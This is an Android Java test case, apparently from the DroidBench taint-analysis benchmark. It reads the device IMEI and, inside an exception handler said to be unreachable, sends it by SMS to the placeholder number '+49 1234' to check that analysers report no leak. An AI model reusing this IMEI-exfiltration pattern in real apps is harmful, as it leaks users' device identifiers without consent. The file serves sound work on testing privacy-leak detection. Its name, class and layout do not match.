package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions6
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A leak happens inside an exception handler that can never be reached, because it
 * handles an exception type that is never thrown.
 * @dataflow source -> imei -> exception -> uncaught
 * @number_of_leaks 0
 * @challenges the analysis must precisely handle exception types across method calls
 */
public class Exceptions7 extends Activity {

	private String imei = "";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_exceptions4);

		try {
			callMe();
		}
		catch (ArrayIndexOutOfBoundsException ex) {
			SmsManager sm = SmsManager.getDefault();
			sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak			
		}
	}

	private void callMe() {
		TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
		imei = telephonyManager.getDeviceId(); //source
		int val = ((int) Math.sqrt(49)) - 7;
		System.out.println(5 - val);
	}

}
